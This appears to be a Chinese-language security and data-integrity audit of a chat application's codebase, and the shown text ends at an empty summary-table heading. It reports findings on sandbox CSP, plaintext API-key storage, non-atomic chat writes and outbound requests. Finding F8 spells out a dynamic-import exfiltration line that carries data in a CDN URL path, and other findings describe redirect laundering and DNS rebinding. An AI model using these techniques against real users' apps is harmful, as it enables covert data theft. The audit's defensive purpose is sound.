# AUDIT-SYSTEM-SECURITY-DATA — 安全与数据域系统审计

- **审计基准**：`dev/audit-system-report` @ `624c4ce`（纯只读审计，未改任何产品代码、未动 git 状态）。
- **审计范围**：沙箱安全姿势（CSP/白名单/consent/样式代理）、密钥处理（落盘/日志/`routeCredential`）、数据完整性（持久化原子性/备份/往返测试/双宿主并发）、失败模式（流中断/磁盘满/journal）、网络面（出站请求全量清单）。
- **口径**：每条发现给位置证据、严重度（高/中/低）、缓解建议与工作量（XS/S/M）。复核通过项不算发现，单列于 §7。文件行号以审计基准提交为准。
- **修订**：r2 全量复核版——初稿的每一条 file:line 引用与每一项机制论断已在基准提交上重新打开核对，修正了 F9/F13/F16 的行号偏差，补齐 cache-trace `error` 字段与更多非原子写点位（F12），其余结论维持。

---

## 0. 总览

**发现共 17 条：高 1、中 7、低 9。**

总体结论：这个代码库的安全**设计与自我陈述**质量很高——opaque origin 隔离（`sandbox="allow-scripts"`）是真正的隔离边界、CSP 被明确定位为第二道线、密钥"永不回传 wire"有线级测试钉死、`cache-trace` 写盘前自带三条纪律、`ScriptCache` 连重定向逐跳都复查。**真正的问题集中在持久化写入的机械层**：聊天文件（最大实测 19 MiB）每次全量非原子重写，且仓库里已有现成的 tmp+rename 模式（`worldbooks.ts`、`cache-trace.ts`）没有推广到最要命的那个 store；双宿主（8787/8790）共享数据目录实测发生过，而全库没有任何锁或互斥。网络面上，`ScriptCache` 与 `script.fetch` 是同一白名单的两套执行，后者恰好少了前者最关键的那道逐跳校验。

Top 风险（按 修复收益/成本 排序）：

1. **F1** 聊天 jsonl 非原子全量重写 + 损坏后静默消失（高）
2. **F2** 双宿主并发写零防护（中）
3. **F3** `script.fetch` 重定向不复查、无大小上限（中）
4. **F4** API key 明文落盘（中）
5. **F5** 无 Host 校验，DNS rebinding 可达 loopback 全部路由（中）
6. **F6** 各 store 损坏静默降级 + 下次写覆盖原文（中）
7. **F7** backups 毫秒单调修复的跨进程盲区（中）
8. **F8** `script-src` 白名单常开 = `import()` 外传通道（中）

---

## 1. 沙箱安全

### 1.1 CSP 现状（复核记录）

`framePolicy`（`apps/iris-web/src/sandbox/srcdoc.ts:85-175`）逐 directive：

| directive | 默认（无网络授权） | 授权后 |
| --- | --- | --- |
| default-src | 'none' | 同左 |
| script-src | `'unsafe-inline' 'unsafe-eval' blob:` + 自身 origin + `https://*.jsdelivr.net https://raw.githubusercontent.com` | **不变**（授权不加宽代码源，`:150-152` 注释明示） |
| connect-src | 'none' | `https:`（`http:` 永不列入，`:115-117`） |
| style-src | `'unsafe-inline'` + `fonts.googleapis.com` + data: + 自身 origin | `https:` 替换字体域 |
| font-src | data: + `fonts.gstatic.com` + **自身 origin**（样式代理回填的 face 来源，fe45239 引入） | 同左 |
| img-src | data: blob: | `https:` data: blob: |
| frame-src / form-action | 'none' / 'none' | 同左 |

隔离的真边界是 `frameSandbox`（`apps/iris-web/src/sandbox/policy.ts:36-43`）：无 document 授权时 `sandbox="allow-scripts"` 单值 = opaque origin，`window.parent.document` 由浏览器抛 SecurityError；shadow 掉的 `window/parent/document` 是兼容层不是安全层（`policy.ts:9-25` 的自我陈述与实现一致，iframe 侧在 `runner.ts:357` 落属性）。srcdoc 内嵌 bootstrap 的 `</script` 拆分（`srcdoc.ts:510-513`）、context 种子的双重 `JSON.stringify` 字符串字面量化（`srcdoc.ts:524-529`）都到位。

### 1.2 发现

#### F8【中】`script-src` 白名单常开：动态 `import()` 是一条绕过网络授权的外传通道

- **位置**：`apps/iris-web/src/sandbox/srcdoc.ts:165`（script-src 拼接 `remotes`，与 networkGranted 无关）；`apps/iris-web/src/sandbox/policy.ts:77`；`packages/iris-script/src/remote.ts:31-34`。
- **证据**：网络授权的承诺是"关掉 connect-src/img-src 就没有外传通道"（`srcdoc.ts:104-119` 的注释）。但 `script-src` 对 `*.jsdelivr.net` / `raw.githubusercontent.com` **无需授权常开**，而动态 `import('https://testingcf.jsdelivr.net/gh/a/b@main/' + data + '/x.js')` 是 script fetch，URL **路径**即可携带数据——请求必然发出（打到攻击者可建的 GitHub 仓库/jsDelivr 日志），404 只是让 import 失败，数据已经出门。卡片不执行任何"网络调用 API"就完成了外传。
- **严重度**：中（需要卡片作者主动构造；但恰恰绕开了用户以为在决策的那个开关）。
- **缓解**：接受并记录（写入 `docs/SANDBOX.md` 的授权语义："授权管的是 connect/img，代码源白名单自身即是一条窄外传通道"）；或在卡片首次动态 import 非白名单**路径形状**时报告。彻底闭合需把 script-src 收进授权，会杀生态，不建议。
- **工作量**：XS（只改文档）/ S（加检测）。

#### F10【低】缺 `base-uri`；CSP 与宿主白名单在裸域上有 1 字符宽的漂移

- **位置**：`srcdoc.ts:136-174`（无 base-uri）；`packages/iris-script/src/remote.ts:67`（`host === entry.suffix` 允许裸域 `jsdelivr.net`）对照 `policy.ts:77` + `srcdoc.ts:86,165`（CSP 侧拼成 `https://*.jsdelivr.net`，按 CSP 规范不匹配裸域）。
- **证据**：卡片可注入 `<base href>` 改变帧内相对 URL 解析；实测无害——同源桥在 shell 侧用 `view.location.href` 重新解析（`apps/iris-web/src/sandbox/runner.ts:497`，`same-origin.ts:38-48`），帧侧 baseURI 只影响第一道分类，第二道才是执法；相对化的资源最终仍被 script-src/style-src 按源拒绝。裸域漂移方向是**宿主略宽**（宿主可取回 CSP 装不上的 URL），只浪费缓存不放大权限。`apps/iris-web/tests/allowlist-drift.test.ts` 已把 SANDBOX.md 文档行与两侧实现三方钉死，但钉的是文档行不是语义。
- **缓解**：`framePolicy` 加 `base-uri 'none'`（帧不需要改 base）；`checkScriptFetch` 去掉裸域分支或 CSP 侧显式加裸域，二选一使语义一致。
- **工作量**：XS。

#### F9【低】零脚本卡的 greeting 内联脚本免询问执行

- **位置**：`apps/iris-web/src/sandbox/consent.ts:135-138`（`interfacesMayBuild`：`unasked && scriptCount === 0` 即建帧，唯一调用点 `apps/iris-web/src/app/MessageInterfaces.tsx:184`）；`apps/iris-web/src/sandbox/srcdoc.ts:469,738`（消息帧把卡 markup 原样放进 srcdoc body，markup 里的 `<script>` 在解析时执行）。
- **证据**：consent 问题统计的是卡的 `scripts` 数组口径。一张 `scripts` 为空、但 greeting/界面 HTML 里带内联 `<script>` 的卡，在"从未询问"状态下帧即建立、脚本即运行——而用户对面板的理解是"没答应过任何东西"。这是有意偏离（`consent.ts:126-130` 引用了 30 KB greeting 被困死的实测，"unasked-with-nothing-to-ask 状态按 upstream 的默认走"），且 declined 状态确实会挡住消息帧；但"安装即执行"与 consent 模型的落差值得被看见而非只活在注释里。
- **缓解**：导入/首次展开时对 markup 内 `<script` 出现次数做一次计数并在卡片信息里展示（不改执行行为，只把事实给用户）；或在 `ConsentAsk` 文案里写明"界面标记中的内嵌脚本随帧执行"。
- **工作量**：S。

#### F17【低】`rewriteStylesheetLinks` 的标签解析在属性值含 `>` 时截断

- **位置**：`srcdoc.ts:232-242`（`/<link\b[^>]*>/gi` + href 替换）、`srcdoc.ts:307-315`（`linkAttributes` 属性扫描）。
- **证据**：`[^>]*` 在遇到属性值内的 `>` 时提前结束匹配——漏改写（方向安全：未改写的白名单链接被 style-src 拒绝并按名报告，非白名单的本来就会被拒）；理论上一个"文本里长得像 link 标签的字符串"被误改写属误报级。`rewritingTemplate`（`srcdoc.ts:269-282`）只覆盖 `parent.document.createElement('template')` 工厂出口，帧内自建模板绕过重写——同样落到 CSP 拒+报告，与 `srcdoc.ts:224-227` 自己声明的范围一致。
- **缓解**：接受为已记录的缺口；若要修，换成一次完整的属性扫描器而非两个正则。
- **工作量**：S。

#### F11【低】同源桥放行任意同源 GET（含其他卡的 avatar）

- **位置**：`apps/iris-web/src/sandbox/runner.ts:476-501`（`ride`：先 `sameOriginTarget`，未命中走 `host.fetch`）；`apps/iris-web/src/sandbox/same-origin.ts:38-48`；shell 侧出口 `apps/iris-web/src/client/store.ts:2585`。
- **证据**：桥有两道 same-origin 判定（帧侧+shell 侧，`same-origin.ts:12-18` 自述"frame 是不可信侧"），且 POST 类写操作由 RPC 端点的 content-type 门挡住（`packages/iris-rpc-host/src/http.ts:33-37`，跨站简单请求发不了 `application/json`）。剩余面：任何卡可读 Iris 源上任何 GET 资源——`/iris/avatar/<其他卡>`（`packages/iris-app-service/src/index.ts:403-427`）、sandbox 资产、bundle 代理。同一 profile 内的卡互读头像属低敏。
- **缓解**：桥上加路径前缀白名单（`/version`、`/sandbox/`、`/iris/script-bundle`）即可关掉 avatar 面。
- **工作量**：XS。

#### 样式代理（`rewriteStylesheetLinks`/`bundle-rewrite.ts`）专项复核：未发现新放水面

- `url=` 参数唯一入口是 `ScriptCache.serve`：`checkScriptFetch` 先行（`packages/iris-app-service/src/script-cache.ts:330-334`），https-only + 域名后缀白名单（`remote.ts:61-70`，`endsWith('.jsdelivr.net')` 带点，`evil-jsdelivr.net` 匹配不上）；重定向逐跳复查、5 跳上限（`script-cache.ts:501-515,535-537`）；单体 8 MiB（`:524-529`）、缓存目录 256 MiB 预算（`:545-550,569-582`），超预算**拒绝写入而非逐出**（防敌意页面挤掉真依赖）。缓存文件名是 URL 的 sha256（`:235-237`），无路径穿越问题。
- 代理回填侧（宿主改写出站 body）：嵌套 specifier 与 `@font-face`/`@import` 目标一律先 `checkScriptFetch` 再包回路由，不过白的**拒绝并留原文**（`packages/iris-app-service/src/bundle-rewrite.ts:152-156,212-215`）——"洗白一个本会被拒的 URL"被注释明示为设计红线（`:20-23`）且实现守住了。样式分支只按 `.css` 后缀判定类型（`script-cache.ts:259-265`），`.css` 后缀返回 JS 字节会以 text/css 伺服（惰性，记录在案的缺口）。`url()` 在 `@font-face` 之外保持原文，让 img-src 的拒绝点名卡片自己选的远端而非我们的路由（`bundle-rewrite.ts:238-243`）——不 laundering。
- SSRF 面：白名单 + https-only + 逐跳校验后，剩余可打的目标就是两个公共 CDN 本身；宿主绑定 loopback（`apps/iris/cordis.yml:59` `host: '127.0.0.1'`）。GET 无 preflight 意味任意本地页面可驱动此路由取白名单 URL——模块自己的注释已把它定价为"有界磁盘填充"（`script-cache.ts:69-83`），本审计认同并记录为 **F15【低，已缓解在案】**。

---

## 2. 密钥处理

### 2.1 复核记录

- **wire 面**：`toWire` 永不带 key，只有 `hasKey: true` 和尾 4 位 `keyTail`（`packages/iris-app-service/src/connections.ts:357-379`；尾位门槛 = key 长度 ≥8，`connections.ts:37-39,324-327`）。线级测试钉死（`tests/connections.test.ts:277-348`：存储后 wire 无 key、编辑保留未展示的 key、空串显式清除）。
- **trace/日志面**：`cache-trace` 的 body 来自 `canonicalBody`，只序列化 system 槽 + 每条消息的 role/text（`packages/iris-app-service/src/fingerprint.ts:135-183`），**没有 header、没有 key**；trace 字段清单（`cache-trace.ts:83-145`）无凭据位。唯一携带"远端文本"的字段是 `error`（`:127-133`）——存的是报告面板同款文案（provider 回显体，见 F16），宿主自身从不拼 key 进错误消息。错误消息契约"message never carries a credential"有专钉：`headerValueFault` 的报错只给索引和码点（`service.ts:1299-1310`），fetch 失败走 `.cause` 链取平台文案（`service.ts:328-341`）。adapter 侧 key 缺失报错只点名 env **变量名**（`packages/iris-llm-openai-compat/src/index.ts:171-176`）。
- **宿主进程内**：`HostConnection.apiKey` 明示"never leaves the process"（`connections.ts:141-142`），`hostDefaultView` 只投影 `keySource`/`keyEnv`（变量**名**，`connections.ts:233-252`）。全库引用 `apiKey` 的产品文件只有三个（connections/service/index），grep 无模板字符串泄漏形。

### 2.2 发现

#### F4【中】API key 明文落盘，无加密、无混淆、无权限位

- **位置**：`connections.ts:51-53`（`apiKey?: string` 注释自认 "Stored in the file"）；`connections.ts:412-415`（`#save` 直写 JSON）；`packages/iris-app-service/src/paths.ts:275`（`connections.json` 在 profile 根）；测试自认这是"the deliberate storage decision"（`tests/connections.test.ts:294-296`）。
- **证据**：`data/` 已 gitignore（`.gitignore:18`），密钥不入库；但磁盘上任何能读用户目录的进程/人/同步盘（OneDrive 等）拿到原文。`routeCredential` 把它读进内存装进 adapter（`service.ts:916-932`），进程内生命周期无问题。
- **缓解**：最低成本先做**文档化 + 目录 ACL**；进阶用 OS 凭据设施（Windows DPAPI `CryptProtectData`）加密 `apiKey` 字段，或接入系统 keychain。注意 F6：加密前先修"损坏静默覆盖"，否则加密层会被"空列表回写"绕过。
- **工作量**：M。

#### F3【中】`script.fetch` 的默认 fetch 不复查重定向、无大小上限——与 ScriptCache 同一白名单两套执行

- **位置**：`packages/iris-app-service/src/service.ts:793`（默认 `fetchRemote: (url) => fetch(url)`，redirect 默认 follow）；`service.ts:3495-3519`（handler 只对**首跳**做 `checkScriptFetch`，不查 `response.url`，`response.text()` 无上限）；对照 `script-cache.ts:501-515`（逐跳复查 + `MAX_HOPS=5`）与 `:524-529`（8 MiB 上限）。
- **证据**：白名单域名若返回指向外域的 302（CDN 侧开放重定向、或 `*.jsdelivr.net` 下用户可控子域服务），内容被原样取回交给卡片；卡片可将其制成 blob URL 执行——`script-src` 本就放行 `blob:`（`srcdoc.ts:165`）。链路：白名单内 302 → 外域代码 → blob: 执行，**白名单被重定向洗白**。另 `response.text()` 无上限，一个超大响应可直接撑爆宿主内存（ScriptCache 有 8 MiB 上限而这里没有）。这条路径正是卡片依赖注入的通道（`runner.ts:494` → `store.ts:2585` → 本 handler），与 ScriptCache 的模块化 import 通道同等常用。
- **严重度**：中（依赖 CDN 返回外域重定向，概率低但机制性存在；内存面则任何白名单大文件即可触发）。
- **缓解**：把 ScriptCache 的逐跳 `checkScriptFetch` + 跳数上限 + 体积上限下沉为一个共享的受控 fetch（或让 `script.fetch` 直接复用 `ScriptCache.load`），两处一个执行体。
- **工作量**：S。

#### F5【中】HTTP/WS 全部路由无 Host 校验，DNS rebinding 打穿"loopback 即可信"

- **位置**：`packages/iris-rpc-host/src/http.ts:5-11`（安全模型陈述："binds to loopback and trusts the machine"，防线只有 content-type preflight）；`packages/iris-rpc-host/src/events.ts:51-64`（WS 的 `isOriginAllowed`：`new URL(origin).host === req.headers.host`——rebinding 场景下 attacker 页面的 Origin 与 Host **同为 attacker 域**，比较恒真）。
- **证据**：rebinding 页面在浏览器眼里与宿主**同源**（域名相同，DNS 已改指 127.0.0.1）：POST 无需 preflight、content-type 门失效、WS Origin 检查失效——RPC 全方法（含 chat 写、connection.save）、bundle/avatar GET 全部可达。`allowedOrigins` 与之无关。全包 grep 无任何 `Host` 头白名单判断。
- **缓解**：在 Iris 自己的传输入口校验 `Host` 头只允许 `127.0.0.1:<port>`/`localhost:<port>`（RPC POST、WS upgrade、bundle、avatar 四处或统一中间层）；一行判断即可让 rebinding 页面在握手即被拒。
- **工作量**：S。

### 2.3 `routeCredential` 阶梯边界复核（936fbfb 之后）

`connections.ts:298-317`：stored（空串=none，302 行 `length > 0`）→ host（仅 `sameEndpointOrigin` 同源，309 行；origin 比较、路径不比，267-276 行，解析失败=拒绝=安全方向）→ none（316 行）。header 随获胜的 key 走（305/312 行），不会出现"host 的 key 配 profile 的 header"。三个消费点已收敛：激活 `#installConnectionFor`（`service.ts:922`）、`connection.test` 阶梯（`service.ts:1209-1256`）、boot 恢复（`service.ts:957-976`）。边界情况逐条：

- **无 endpoint 的档案**：`routeOf` 返回 provider 本名（`connections.ts:615-620`），激活只写 settings 层、不装适配器；boot 恢复对 `baseURL` 缺失早退（`service.ts:967`）——host 的凭据由 composition 自己的适配器携带，`routeCredential` 不经手，阶梯不背这个锅。
- **坏 URL + 无 key 的档案**：`badUrlVerdict` 在 probe 双点前置（`service.ts:1291` 与 `#probeEndpoint` 内），但**激活路径没有等价前置**——带打错的 endpoint 激活会装出一个注定传输失败的适配器，直到生成才报 `request to … failed`。缓解：`connection.activate` 复用 `badUrlVerdict`。工作量 XS。
- **激活报告**：`key: stored|host|none` 进日志（`service.ts:933-937`，注释明示"names the source, never the key"），boot 恢复 none 时告警。
- **同源判定的路径不比**：`https://host/v1` 与 `https://host/attacker-path` 视为同源，host key 会发往同域的任意路径。这是有意的（`connections.ts:257-263` 注释：`…/v1` 与 `…/v1beta/openai` 必须同判），且配置路径者即用户本人，不构成提权；记录为已知语义。

---

## 3. 数据完整性

### 3.1 原子写使用面盘点

tmp+rename（`writeFile(temp)` → `rename`）模式全库只有两处：`worldbooks.ts:509-511,541-547`、`cache-trace.ts:629-631`（后者注释明说"the pattern `worldbooks.ts` uses"）。**直写 `writeFile`** 的（grep 全量）：

- 聊天三口：`chats.ts:760` save（每 turn 一次）、`:721` importFile、`:802` restoreFile
- JSON store：settings（`settings.ts:600`）、connections（`connections.ts:414`）、script-variables（`:191`）、favorites（`:60`）、script-buttons（`:145`）、card-storage（`:331`）、persona（`:155`）、script-library（`script-library.ts:171`）、scripts 策略（`scripts.ts:188`）
- 分区型 store：context（`context.ts:436,473,502,514`）、worldbook 绑定（`materialise.ts:162`）
- 卡与预设文件：library 卡文件（`library.ts:378,471`）、卡 PNG/JSON 原地改写（`library.ts:594,607`）、预设文件（`presets.ts:198`）
- 备份快照：`backups.ts:260`

#### F1【高】聊天 jsonl 每次全量非原子重写；损坏后聊天静默消失

- **位置**：`packages/iris-app-service/src/chats.ts:757-761`（save 全量重写，每 turn 一次）；`packages/iris-persistence/src/sillytavern.ts:107-121`（parseChatFile 逐行 `JSON.parse`，一坏全坏）；`chats.ts:446-447`（open 时 parse 在 try 外，损坏抛原始 SyntaxError）；`chats.ts:285-297`（list 经 `#summarize` 静默跳过解析不了的文件，`:821-841` 同样吞错）。
- **证据**：实测语料最大会话 677 楼 / 19 MiB（`chats.ts:308` 注释），**每一 turn 都把整个文件重写一遍**。崩溃、断电、磁盘满、杀进程落在写入中途 → 尾行截断 → 该会话从此：`open` 报错、`list` 里无声消失（不解析的文件直接跳过，用户看到的是"聊天没了"）。快照只保护"危险操作"前（import-overwrite `chats.ts:719-721`、delete-message/rewrite/pre-restore/cleanup），**普通 save 前没有快照**；`backups` 目录里最新的一份可能是很多 turn 之前的。这是全库唯一能无声丢失用户创作内容的路径。仓库自己的话："A half-written trace is worse than no trace"（`cache-trace.ts:30-31`）——对聊天文件这话成立一百倍，而聊天文件恰是没走这个模式的那个。
- **缓解**：`ChatStore.save`/`restoreFile`/`importFile` 改为同款 tmp+rename（模式现成，`worldbooks.ts:509-511`）；顺带在 `list`/`open` 对解析失败的文件给出按名报告（不再无声跳过）。
- **工作量**：S（原子化本体）+ XS（报告）。

#### F2【中】双宿主并发写零防护（8787/8790 实况发生过）

- **位置**：全库无 lock/`O_EXCL`/flock（grep 证实，产品代码零命中）；`apps/iris/bin.ts:23`（读 .env）、`apps/iris/cordis.yml:59-60`（`host: '127.0.0.1'`、`port: IRIS_PORT ?? 8787`）、`:76`（`dataDir: IRIS_DATA_DIR ?? './data'`，相对 cwd，同 cwd 启动两实例即共享全量数据）；`bin.ts:49-51` 注释自认"an already-taken port"会让配置端口与实际绑定端口分叉并照常启动。
- **证据**：notes 里留有双实例实况：`notes/DEVIATIONS.md:1033`（"8790 主宿主 character 目录提取"）、`:1038`（"errUnsupported 来自 8790 宿主的旧进程/旧前端"）、`:1047`（"8790 宿主需按 PID 重启进主线"）；`notes/ACTION-PLAN.md:3,67` 通篇是 8790 实测计划。两个进程都是**全内存态 + 全文件重写**（chats/settings/connections 均如此）：A 进程 open 的会话在 B 进程推进后，A 的下一次 save 用 A 的陈旧全量**整文件覆盖** B 的更新——丢楼层、丢 usage、丢变量，且无任何告警。配置里唯一的目录防护是 `sillyTavernDir` 与 dataDir 的重叠拒绝（`cordis.yml:102`），管的是 ST 安装目录，不管双实例。
- **缓解**：数据目录放 `host.lock`（`open(path, 'wx')` + 写 pid，启动即拒绝或只读警告）；退一步，检测到端口漂移（配置 8787 实际绑了 8788）时在启动横幅与报告面板声明"可能有另一实例"。
- **工作量**：S。

#### F6【中】JSON store 损坏一律静默降级，且下一次写会用降级态覆盖原文

- **位置**：`settings.ts:193-226`（load：readFile 失败→`#found=false`；JSON.parse 失败→catch"Keep the defaults"）；`connections.ts:395-409`（`#loaded = true` 先行，解析失败吞掉 → 空档案）；同型的还有 `scripts.ts:158-186`、persona/favorites/card-storage/script-variables/script-buttons。这些 store 的后续任何一次 `save()` 都会把**降级后的内存态**写回原路径——用户的设置/密钥档案/授权记录一次事故全部归零，且没有 `.bak`、没有损坏文件隔离。
- **证据**：`scripts.ts:180-184` 的注释精确表达了现状（"a corrupt file loses grants rather than inventing them"）——对 `scriptsAllowed` 这是安全方向（默认 deny），但**卡级 regex 层的默认是 `!== false` 即放行**（`scripts.ts:253-259`）：策略文件损坏 = 全部卡的 regex 层静默回到放行。预设 regex 层是 `=== true` 的 default-deny（a47b669），两层不对称，损坏后一个收一个放。
- **缓解**：load 解析失败时把原文件改名为 `<path>.corrupt-<ts>`（或先读出保留），报告一条 fault，再以默认态继续；写前无需变更。
- **工作量**：S。

#### F7【中】backups 毫秒单调修复（57f9023）的跨进程盲区

- **位置**：`packages/iris-app-service/src/backups.ts:246-259`（`#lastStampMs` 单调 + `-2` 后缀兜底；252 行 `Math.max(Date.now(), #lastStampMs + 1)`）；`backups.ts:56-57`（NAME_RE 的碰撞段 `-([2-9]\d*)`）；`backups.ts:127-131`（rotateBackups 纯字典序，`ordered.slice(0, len - retention)` 从前删）。
- **证据**：修复本身正确——单进程内单调戳保证名序=时序，注释（`:249-251`）自认兜底场景是"a second store, or a restart within the same millisecond"。但它**不覆盖双进程**：8787 与 8790 各有 `#lastStampMs`，同毫秒各写一份时，带 `-2` 的名字按字典序排在无后缀名**之前**（`-` 0x2D < `.` 0x2E），`rotateBackups` 在保留边界处会把**较新**的 `-2` 副本当旧的先删。触发条件窄（同毫秒 + 恰在保留边界），但后果是"最该留的那份快照先没"，且与 F2 同根。
- **缓解**：碰撞后缀改插在 stamp 与 `-f` 之间（如 stamp 位 `...-790`）保字典序=时序；或 rotation 对同 stamp 组按 mtime 决胜。
- **工作量**：S。

#### F12【低】快照与其余小文件写入同样非原子

- **位置**：`backups.ts:260`（快照直写）；§3.1 清单的全部直写点，含 r2 补入的 `context.ts` 四处分区、`materialise.ts:162`、`presets.ts:198`、`library.ts:594,607`（卡 PNG/JSON 原地改写——这是用户卡文件的唯一写通道，半截即毁卡）。
- **证据**：快照半截仍匹配 NAME_RE（名字在写前已定），会被 `#listDir` 计入保留池，最坏在边界挤掉一份完好快照；小文件（settings 等）写入窗口小，但 settings.json 每次采样变更都重写，长期运行同样有截断概率。
- **缓解**：与 F1 同一支 `atomicWriteFile` 工具一次推广。
- **工作量**：XS（在 F1 之上）。

### 3.2 导入导出往返测试覆盖面盘点

| 格式 | 往返测试 | 证据 |
| --- | --- | --- |
| chats（ST jsonl） | ✅ 有，byte-stable + 真实安装 fixture | `packages/iris-app-service/tests/chat-transfer.test.ts:22-30`（四条验收：真机会话逐楼等价、分支链两端可开、导出再导入且二次导出字节稳定、非 ST 文件按名拒绝）；`tests/greeting-swipe-contract.test.ts`（从真卡 PNG 提取 alternate_greetings 过 import→storage→export 全链） |
| characters（PNG 卡） | ✅ 有 | `packages/iris-character/tests/card.test.ts`、`png.test.ts`；`tests/import-images.test.ts`（字节级往返、md5/缓存一致性 `library.ts:570-590`） |
| presets（OpenAI Settings json） | ✅ 有 | `tests/preset-store.test.ts`、`tests/preset-read.test.ts` |
| worldbooks（json） | ✅ 有 | `tests/worldbook-write.test.ts`、`worldbook-source.test.ts`、`worldbook-digest.test.ts` |
| ST 全局 settings 导入 | ✅ 单向有 | `tests/st-settings-import.test.ts`（ST→Iris 单向，无回程是格式使然） |
| 持久化键序 | ✅ 有 | `packages/iris-persistence/tests/key-order.test.ts`（导出字段顺序兼容） |
| connections.json | ❌ 无（且无导出功能） | `tests/connections.test.ts` 只测形状/合并语义/wire 无 key，无落盘往返 |
| personas / favorites / script-variables / card-storage / script-buttons / context / script-library / extension-settings | ❌ 无 | 各有形状单测（`persona.test.ts` 等），损坏恢复路径（F6）零测试 |

内部 store 无"导出"故无往返可测，但**损坏→降级→覆盖**这条路径值得一条"写入坏文件再 load 不丢盘上原文"的测试——目前一个都没有。

---

## 4. 失败模式

### 4.1 流中断（复核结论：设计完整）

`#fail`（`service.ts:4049-4110`）三出口：用户 stop 且有 partial → 以 `INTERRUPTED_SOURCE`（`service.ts:95`）落为真候选并 `#settle(…, 'aborted')`（`:4093-4103`）——半截回复被保留且被计费；impersonate 的 partial 落为用户行（`:4057-4072`）；provider 错误不留"文本在用户嘴里"的半截行（`:4040-4042` 注释）。interrupted turn 的 usage 字段**缺席而非 0**（`cache-trace.ts:127-133`），防止"中断被读成免费"。adapter 的超时 abort 与用户 stop 用双向判据区分（`:4061-4067`）。遗留问题只有一条：

#### F13【低】settle 内 save 失败后既无 stream.end 也无 stream.error

- **位置**：`service.ts:4018-4028`（`#settle` 末尾 `chats.save`（4018）抛出 → catch（4025）只做 `entry.finish()` + `#report`，不再 broadcast 任何 stream 事件）。对照：`#fail` 的三条收尾路径（impersonate `:4076-4086`、interrupted 落穿 `:4104-4110`、provider 错误 `:4112-4118`）都会补发 `stream.error`——唯独正常 settle 的 catch 不发。
- **证据**：磁盘满/权限错误时，回复在内存里、前端流视图停在没有终态事件的生成态，直到刷新；报告面板有一条 fault（`#report` → logger + diagnostics），但 stream 通道沉默。
- **缓解**：catch 里补发 `stream.error`（code 复用 failureCode，message 用 save 的错误），前端有终态、可重试。
- **工作量**：XS。

### 4.2 磁盘满 / 权限错误行为表

| store | 行为 | 证据 |
| --- | --- | --- |
| cache-trace | 写失败不抬 generation，报告后丢弃 | `cache-trace.ts:616-638`（"a trace must never cost a generation"） |
| script-bundle 缓存 | 不可写仍照常伺服本次取回的字节 | `script-cache.ts:557-561` |
| backups | 轮转删除失败报告不抬，新快照已落 | `backups.ts:487-494` |
| chats.save | 正常路径报 stream.end 前抛 → 进 F13 的静默 catch；`#fail` 路径报 stream.error；**内存与盘自此分叉**，重启丢该 turn | `service.ts:4018-4028`、`:4104-4118` |
| settings/connections 等小 store | `save` 抛错直达 RPC（调用方收到错误），**内存已先变更**——与盘分叉，下次成功写时补盘 | `settings.ts:353-381`（先改 `#file` 后 `await this.save()`）、`connections.ts:435-487` 等（顺序全库一致） |
| script-policy | 损坏文件静默默认态，卡级 regex 回到放行 | 见 F6 |

总体评价：诊断面做得好（几乎每处失败都有按名报告），但"内存先行、落盘后置、失败后不回滚"的一致性缺口是全库通式——单进程下靠下次写收敛，双进程下被 F2 放大。

### 4.3 journal 一致性（复核结论）

持久形态只有 ST jsonl 一个：session journal 每次从文件重建（`chats.ts:437-481` open → `parseChatFile` → `importChat` → `hydrateVariables/hydrateUsage`），没有独立 WAL/journal 文件，因此"崩溃后重放"的语义=**最近一次成功 save 的状态**，不存在 journal 与 jsonl 双源不一致的问题。重建链有专项测试（`tests/rebuild-hydration.test.ts`、`tests/hydration-drops.test.ts`、`tests/history-stability.test.ts`）。残余风险与 F1 同根：save 的非原子窗口内崩溃，重建的不是旧状态而是坏文件。

#### F14【低】open 损坏聊天抛原始 SyntaxError 而非 `invalid-request`

- **位置**：`chats.ts:440-447`（`readFile` 有 try→notFound，`parseChatFile` 在守卫外）。
- **证据**：损坏文件的 `chat.open` 会把 `Unexpected token … in JSON` 直达 wire，而 `list` 对同一文件是静默跳过——两个面给出两种都不指因的答案。修 F1 的报告项时顺手包一层 `invalid("chat file is corrupt: …")`。
- **工作量**：XS。

---

## 5. 网络面：出站请求完整清单

全库 `fetch(` 调用点逐一核对（grep 全量，剔除测试与同源 shell 取资产）：

| # | 出站请求 | 触发方 | 同意/白名单状态 |
| --- | --- | --- | --- |
| 1 | `POST {baseURL}/chat/completions`（LLM 生成，含凭据 header） | 每次生成（`iris-llm-openai-compat/src/index.ts:287-297`） | 用户显式配置端点（cordis.yml `IRIS_BASE_URL` 或连接档案）；凭据按 `routeCredential` 阶梯；header 名可配（`:180-181`）。携带 `attributionHeaders()` 标识。**无白名单（用户自配即同意）** |
| 2 | `GET {baseURL}/models`（端点探测/模型列表） | connection.test、模型列表刷新（`service.ts:1316-1322`） | 同上；`badUrlVerdict`/`headerValueFault` 前置（`:1291,1299`），超时预算 `probeTimeoutMs` |
| 3 | `GET https://*.(jsdelivr.net|raw.githubusercontent.com)/…`（bundle 代理回源） | 卡片 import、样式代理（`url=` 白名单内）（`script-cache.ts:118-132`） | **白名单强制**：首跳 + 重定向逐跳 `checkScriptFetch`、5 跳上限、8 MiB/256 MiB 上限、`credentials: 'omit'`（`:477-537`） |
| 4 | `GET` 同 #3 域（`script.fetch` 桥） | 卡片经 RPC 请求远程文本（`service.ts:3495-3519`） | 白名单**首跳**；重定向不复查、无体积上限——**F3** |
| 5 | 帧内直连 `fonts.googleapis.com`（CSS）/`fonts.gstatic.com`（字体） | 卡帧默认 CSP 放行（`srcdoc.ts:83-102`） | 默认放行的唯一字体域对，"样式表与字体不执行代码"论断成立；授权后扩大到 `https:` 全域属用户决策 |
| 6 | 帧内直连白名单 CDN 的 script/style（授权与否均可，见 F8） | 卡片 `<script src>`/import | 帧内 CSP 与宿主 `checkScriptFetch` 同表（三方钉死 `apps/iris-web/tests/allowlist-drift.test.ts`） |
| 7 | 同源桥：shell 代取自身 origin 的 GET | 卡片 `fetch('/…')`（`runner.ts:496-501`） | 仅 loopback 自身，POST 写路径被 RPC content-type 门挡（`rpc-host/http.ts:33-37`）；avatar 读面见 F11 |

`st-install.ts` 只读用户 ST 安装目录的本地文件（`st-install.ts:1-11`，无网络）；`model-context.ts` 里的 https 串全是文档引用注释。不存在其他出站：avatar/沙箱资产/manifest/bootstrap/RPC 全部是宿主自身源内；无遥测、无更新检查、无外部字体/统计（grep telemetry/analytics/update 零命中）。**出站面收敛为：用户配置的 LLM 端点 + 两个 CDN 域 + 自身源。**

---

## 6. 严重度汇总表

